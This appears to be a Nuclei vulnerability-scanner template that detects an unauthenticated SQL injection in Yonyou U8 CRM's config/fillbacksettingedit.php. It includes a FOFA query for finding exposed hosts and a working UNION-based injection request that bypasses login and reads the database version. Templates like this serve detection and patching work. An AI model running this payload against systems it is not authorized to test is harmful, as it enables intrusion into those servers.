id: yongyouU8-CRM-fillbacksettingedit_php-sql

info:
  name: 用友U8 CRM config/fillbacksettingedit.php SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="用友U8CRM"
    用友 U8 CRM客户关系管理系统 config/fillbacksettingedit.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487886&idx=1&sn=e4b869bedbf92b469db05f5e12665a77&chksm=c267a4bdf5102dabcd3143b32fef256da5eba7af1355708e5bca3385ee8d9990a20f25c230d6&token=129725642&lang=zh_CN#rd
  tags: sql injection


http:
  - raw:
      - |
        GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
        Cookie: PHPSESSID=bgsesstimeout-;

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Microsoft SQL'
      - type: status
        status: 
          - 200



